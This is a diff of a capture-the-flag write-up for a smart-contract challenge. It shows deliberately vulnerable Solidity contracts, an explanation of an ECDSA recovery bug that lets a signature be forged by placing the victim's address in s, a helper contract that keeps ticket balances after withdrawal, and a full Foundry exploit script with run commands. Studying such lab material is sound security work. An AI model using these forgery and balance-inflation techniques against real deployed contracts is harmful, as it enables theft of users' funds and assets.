@@ -55,35 +55,32 @@ The gatekeeper contract that manages the party state:
 contract Guardian {
     IParty public immutable market;
     bool public locked = true;
-    
+
     modifier onlyUnlocked() {
         require(!locked, "Party not started");
         _;
     }
-    
+
     function startParty(address sponsor, bytes calldata signature) external {
         require(locked, "Already started");
-        
-        // Verify sponsor is address(0) by checking all bytes
+
         for (uint i = 0; i < 20; i++) {
             require(uint8(bytes20(sponsor)[i]) == 0, "Invalid sponsor");
         }
-        
-        // Verify signature
+
         bytes32 hash = keccak256(abi.encodePacked(sponsor));
         address signer = ECDSA.tryRecover(hash, signature);
         require(signer == sponsor, "Invalid signature");
-        
+
         locked = false;
     }
-    
+
     function batchTransaction(
         Order[] calldata orders,
         bytes32[2] calldata rs,
         bytes32[2] calldata ss,
         uint[2] calldata vs
     ) external onlyUnlocked {
-        // Process batch ticket transfers
         for (uint i = 0; i < orders.length; i++) {
             market.check(orders[i], rs, ss, vs);
         }
@@ -101,36 +98,36 @@ contract BSidesParty is IParty {
     uint256 public lockedETH;
     uint256 public ticketCounter = 1;
     address public immutable guardian;
-    
+
     function buy() external payable {
         require(msg.value == 1 ether, "Ticket costs 1 ETH");
         require(balances[msg.sender] == 0, "Already have ticket");
-        
+
         ticketCounter++;
         balances[msg.sender]++;
         ownerOf[ticketCounter] = msg.sender;
         lockedETH += msg.value;
     }
-    
+
     function withdraw(uint256 tokenId) external {
         require(ownerOf[tokenId] == msg.sender, "Not owner");
         require(lockedETH >= 1 ether, "Insufficient funds");
-        
+
         balances[msg.sender]--;
         delete ownerOf[tokenId];
         lockedETH -= 1 ether;
-        
+
         payable(msg.sender).transfer(1 ether);
     }
-    
+
     function transfer(address to, uint256 tokenId) external {
         require(ownerOf[tokenId] == msg.sender, "Not owner");
-        
+
         balances[msg.sender]--;
         balances[to]++;
         ownerOf[tokenId] = to;
     }
-    
+
     function check(
         Order calldata order,
         bytes32[2] calldata rs,
@@ -138,8 +135,7 @@ contract BSidesParty is IParty {
         uint[2] calldata vs
     ) external {
         require(msg.sender == guardian, "Only guardian");
-        
-        // Verify host signature
+
         bytes32 hostHash = keccak256(abi.encodePacked(
             order.host.account,
             order.invited.account,
@@ -152,8 +148,7 @@ contract BSidesParty is IParty {
             ss[1]
         );
         require(hostSigner == order.host.account, "Invalid host signature");
-        
-        // Verify invited signature
+
         bytes32 invitedHash = keccak256(abi.encodePacked(
             order.invited.account,
             order.host.account,
@@ -166,11 +161,10 @@ contract BSidesParty is IParty {
             ss[0]
         );
         require(invitedSigner == order.invited.account, "Invalid invited signature");
-        
-        // Transfer ticket from host to invited
+
         uint256 tokenId = order.values[1];
         require(ownerOf[tokenId] == order.host.account, "Host doesn't own ticket");
-        
+
         balances[order.host.account]--;
         balances[order.invited.account]++;
         ownerOf[tokenId] = order.invited.account;
@@ -191,28 +185,24 @@ library ECDSA {
         bytes32 s
     ) internal view returns (address result) {
         assembly {
-            // Prepare memory for ecrecover call
-            let m := mload(0x40)  // Free memory pointer
-            
-            mstore(m, hash)       // Store hash at offset 0x00
-            mstore(add(m, 0x20), v)   // Store v at offset 0x20
-            mstore(add(m, 0x40), r)   // Store r at offset 0x40
+            let m := mload(0x40)
+
+            mstore(m, hash)
+            mstore(add(m, 0x20), v)
+            mstore(add(m, 0x40), r)
             mstore(add(m, 0x60), s)   // Store s at offset 0x60 [!]
-            
+
             // ⚠️ VULNERABILITY: Ignore the return value of staticcall
             pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20))
-            
-            // Restore the zero slot
+
             mstore(add(m, 0x60), 0)
-            
-            // If staticcall succeeds, returndatasize() = 0x20
-            // If it fails, returndatasize() = 0x00
+
             // This XORs the offset: success → 0x60 ^ 0x20 = 0x40
             //                        failure → 0x60 ^ 0x00 = 0x60
             result := mload(add(m, xor(0x60, returndatasize())))
         }
     }
-    
+
     function tryRecover(
         bytes32 hash,
         bytes calldata signature
@@ -244,24 +234,22 @@ contract Setup {
     IGuardian public immutable guardian;
     address public immutable owner;
     address public immutable player;
-    
+
     constructor(address _player) payable {
         player = _player;
         owner = address(this);
-        
-        // Deploy contracts
+
         party = new BSidesParty();
         guardian = new Guardian(address(party));
-        
-        // Mint first ticket to owner
+
         party.buy{value: 1 ether}();
     }
-    
+
     function isSolved() external view returns (bool) {
         return (
-            party.balances(owner) == 0 &&      // Owner has no tickets
-            party.balances(player) > 1 &&      // Player has multiple tickets
-            party.lockedETH() == 0             // All ETH withdrawn
+            party.balances(owner) == 0 &&
+            party.balances(player) > 1 &&
+            party.lockedETH() == 0
         );
     }
 }
@@ -303,20 +291,18 @@ Let's analyze the vulnerable code step by step:
 
 ```solidity
 assembly {
-    let m := mload(0x40)              // Get free memory pointer
-    
-    mstore(m, hash)                    // [m+0x00] = hash
-    mstore(add(m, 0x20), v)           // [m+0x20] = v
-    mstore(add(m, 0x40), r)           // [m+0x40] = r
+    let m := mload(0x40)
+
+    mstore(m, hash)
+    mstore(add(m, 0x20), v)
+    mstore(add(m, 0x40), r)
     mstore(add(m, 0x60), s)           // [m+0x60] = s [IMPORTANT]
-    
-    // Call ecrecover, output to [m+0x40]
+
     // ⚠️ The return value (success/failure) is DISCARDED via pop()
     pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20))
-    
-    mstore(add(m, 0x60), 0)           // Clear [m+0x60]
-    
-    // Calculate result location based on returndatasize()
+
+    mstore(add(m, 0x60), 0)
+
     // If success: 0x60 ^ 0x20 = 0x40 → read from output buffer ✓
     // If failure: 0x60 ^ 0x00 = 0x60 → read from s parameter! ✗
     result := mload(add(m, xor(0x60, returndatasize())))
@@ -349,7 +335,7 @@ assembly {
    xor(0x60, returndatasize())
    = xor(0x60, 0x00)
    = 0x60
-   
+
    result := mload(add(m, 0x60))
    ```
    This reads from memory location `[m+0x60]`, which still contains our `s` value!
@@ -382,17 +368,15 @@ The Guardian starts in a `locked` state. To unlock it, we must call `startParty(
 ```solidity
 function startParty(address sponsor, bytes calldata signature) external {
     require(locked, "Already started");
-    
-    // All 20 bytes of sponsor must be zero
+
     for (uint i = 0; i < 20; i++) {
         require(uint8(bytes20(sponsor)[i]) == 0, "Invalid sponsor");
     }
-    
-    // Signature must verify
+
     bytes32 hash = keccak256(abi.encodePacked(sponsor));
     address signer = ECDSA.tryRecover(hash, signature);
     require(signer == sponsor, "Invalid signature");
-    
+
     locked = false;
 }
 ```
@@ -415,7 +399,6 @@ We need `> 1` ticket, but the `buy()` function has a restriction:
 function buy() external payable {
     require(msg.value == 1 ether, "Ticket costs 1 ETH");
     require(balances[msg.sender] == 0, "Already have ticket");
-    // ...
 }
 ```
 
@@ -425,24 +408,19 @@ We can only buy once per address. The solution: **use a helper contract** to exp
 contract GhostMinter {
     IParty public party;
     address public player;
-    
+
     constructor(address _party, address _player) {
         party = IParty(_party);
         player = _player;
     }
-    
+
     function attack() external payable {
-        // Buy ticket (ID increments automatically)
         party.buy{value: 1 ether}();
-        
-        // Get the ticket ID (last minted)
+
         uint256 ticketId = party.ticketCounter();
-        
-        // Withdraw (get ETH back, burn ticket from our balance)
+
         party.withdraw(ticketId);
-        
-        // Transfer the "ghost" ticket to player
-        // This works because ownerOf still points to us!
+
         party.transfer(player, ticketId);
     }
 }
@@ -460,9 +438,9 @@ This is where we leverage the ECDSA vulnerability. The `batchTransaction` functi
 
 ```solidity
 struct Order {
-    User host;      // The current ticket owner
-    User invited;   // The recipient
-    uint256[2] values;  // [nonce, ticketId]
+    User host;
+    User invited;
+    uint256[2] values;
 }
 
 function batchTransaction(
@@ -484,19 +462,18 @@ The `check` function verifies both the host and invited signatures. We'll forge 
 1. **Create a valid signature for ourselves (invited):**
    ```solidity
    bytes32 invitedHash = keccak256(abi.encodePacked(
-       player,      // invited.account
-       owner,       // host.account
-       ticketId     // values[1]
+       player,
+       owner,
+       ticketId
    ));
    (uint8 v, bytes32 r, bytes32 s) = signWithPrivateKey(invitedHash, playerKey);
    ```
 
 2. **Forge the owner's signature (host):**
    ```solidity
-   // Craft malicious signature components
-   vs[1] = 0;  // Invalid v triggers ecrecover failure
-   rs[1] = bytes32(uint256(1));  // Arbitrary r value
-   ss[1] = bytes32(uint256(uint160(owner)));  // Owner address as s!
+   vs[1] = 0;
+   rs[1] = bytes32(uint256(1));
+   ss[1] = bytes32(uint256(uint160(owner)));
    ```
 
 3. **Submit the batch transaction:**
@@ -506,7 +483,7 @@ The `check` function verifies both the host and invited signatures. We'll forge 
        invited: User(player, ""),
        values: [uint256(nonce), uint256(ticketId)]
    });
-   
+
    guardian.batchTransaction([order], rs, ss, vs);
    ```
 
@@ -521,7 +498,6 @@ The `check` function verifies both the host and invited signatures. We'll forge 
 ## Complete Exploit Implementation
 
 ```solidity
-// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.14;
 
 import "forge-std/Script.sol";
@@ -563,41 +539,34 @@ struct User {
 struct Order {
     User host;
     User invited;
-    uint256[2] values;  // [nonce, ticketId]
+    uint256[2] values;
 }
 
-// Helper contract for ghost balance attack
 contract GhostMinter {
     IParty public party;
     address public player;
-    
+
     constructor(address _party, address _player) {
         party = IParty(_party);
         player = _player;
     }
-    
+
     function attack() external payable {
         require(msg.value >= 1 ether, "Need 1 ETH");
-        
-        // Buy a ticket
+
         party.buy{value: 1 ether}();
-        
-        // Get the ticket ID
+
         uint256 ticketId = party.ticketCounter();
-        
-        // Withdraw to get ETH back
+
         party.withdraw(ticketId);
-        
-        // Transfer the ticket to player
-        // This creates a "ghost" balance
+
         party.transfer(player, ticketId);
-        
-        // Return remaining ETH
+
         if (address(this).balance > 0) {
             payable(player).transfer(address(this).balance);
         }
     }
-    
+
     receive() external payable {}
 }
 
@@ -608,46 +577,45 @@ contract Solve is Script {
     address public owner;
     address public player;
     uint256 public playerKey;
-    
+
     function run() external {
-        // Get setup parameters from environment
         address setupAddr = vm.envAddress("SETUP_ADDRESS");
         playerKey = vm.envUint("PLAYER_PRIVATE_KEY");
         player = vm.addr(playerKey);
-        
+
         setup = ISetup(setupAddr);
         party = setup.party();
         guardian = setup.guardian();
         owner = setup.owner();
-        
+
         console.log("=== Initial State ===");
         console.log("Owner balance:", party.balances(owner));
         console.log("Player balance:", party.balances(player));
         console.log("Locked ETH:", party.lockedETH());
-        
+
         vm.startBroadcast(playerKey);
-        
+
         // Phase 1: Unlock Guardian
         unlockGuardian();
-        
+
         // Phase 2: Accumulate Tickets
         accumulateTickets();
-        
+
         // Phase 3: Steal Owner's Ticket
         stealOwnerTicket();
-        
+
         vm.stopBroadcast();
-        
+
         console.log("\n=== Final State ===");
         console.log("Owner balance:", party.balances(owner));
         console.log("Player balance:", party.balances(player));
         console.log("Locked ETH:", party.lockedETH());
         console.log("Solved:", setup.isSolved());
     }
-    
+
     function unlockGuardian() internal {
         console.log("\n[Phase 1] Unlocking Guardian...");
-        
+
         try guardian.startParty(address(0), "") {
             console.log("✓ Guardian unlocked successfully");
         } catch Error(string memory reason) {
@@ -655,53 +623,47 @@ contract Solve is Script {
             revert("Guardian unlock failed");
         }
     }
-    
+
     function accumulateTickets() internal {
         console.log("\n[Phase 2] Accumulating Tickets...");
-        
+
         uint256 currentBalance = party.balances(player);
         uint256 requiredTickets = 2;
-        
+
         while (currentBalance < requiredTickets) {
-            // Deploy ghost minter
             GhostMinter ghost = new GhostMinter(address(party), player);
-            
-            // Execute attack
+
             ghost.attack{value: 1 ether}();
-            
+
             currentBalance = party.balances(player);
             console.log("Player balance after ghost attack:", currentBalance);
         }
-        
+
         console.log("✓ Accumulated sufficient tickets");
     }
-    
+
     function stealOwnerTicket() internal {
         console.log("\n[Phase 3] Stealing Owner's Ticket...");
-        
+
         if (party.balances(owner) == 0) {
             console.log("Owner has no tickets to steal");
             return;
         }
-        
-        // Find owner's ticket ID (usually ticket #1)
+
         uint256 ownerTicketId = 1;
         require(party.ownerOf(ownerTicketId) == owner, "Owner doesn't own ticket #1");
-        
-        // Create order
+
         Order[] memory orders = new Order[](1);
         orders[0] = Order({
             host: User(owner, ""),
             invited: User(player, ""),
-            values: [uint256(1), ownerTicketId]  // nonce=1, ticketId
+            values: [uint256(1), ownerTicketId]
         });
-        
-        // Prepare signature arrays
+
         bytes32[2] memory rs;
         bytes32[2] memory ss;
         uint[2] memory vs;
-        
-        // Valid signature for invited (player)
+
         bytes32 invitedHash = keccak256(abi.encodePacked(
             player,
             owner,
@@ -714,13 +676,11 @@ contract Solve is Script {
         vs[0] = vInvited;
         rs[0] = rInvited;
         ss[0] = sInvited;
-        
-        // Forged signature for host (owner)
-        // Exploit: v=0 causes ecrecover to fail, s contains owner address
-        vs[1] = 0;  // Invalid v
-        rs[1] = bytes32(uint256(1));  // Arbitrary r
-        ss[1] = bytes32(uint256(uint160(owner)));  // Owner address as s!
-        
+
+        vs[1] = 0;
+        rs[1] = bytes32(uint256(1));
+        ss[1] = bytes32(uint256(uint160(owner)));
+
         try guardian.batchTransaction(orders, rs, ss, vs) {
             console.log("✓ Successfully stole owner's ticket!");
         } catch Error(string memory reason) {
@@ -734,17 +694,13 @@ contract Solve is Script {
 ## Deployment and Execution
 
 ```bash
-# Set environment variables
 export SETUP_ADDRESS=<deployed_setup_address>
 export PLAYER_PRIVATE_KEY=<your_private_key>
 export RPC_URL=<rpc_endpoint>
 
-# Run the exploit
 forge script Solve --rpc-url $RPC_URL --broadcast -vvvv
 
-# Verify solution
 cast call $SETUP_ADDRESS "isSolved()" --rpc-url $RPC_URL
-# Returns: true (0x0000...0001)
 ```
 
 ## Why Each Step is Necessary
@@ -781,26 +737,23 @@ function tryRecover(
     bytes32 r,
     bytes32 s
 ) internal view returns (address result) {
-    // Validate v parameter
     if (v != 27 && v != 28) {
         return address(0);
     }
-    
+
     assembly {
         let m := mload(0x40)
-        
+
         mstore(m, hash)
         mstore(add(m, 0x20), v)
         mstore(add(m, 0x40), r)
         mstore(add(m, 0x60), s)
-        
-        // Check the return value!
+
         let success := staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20)
-        
+
         if success {
             result := mload(add(m, 0x40))
         }
-        // If not success, result remains address(0)
     }
 }
 ```
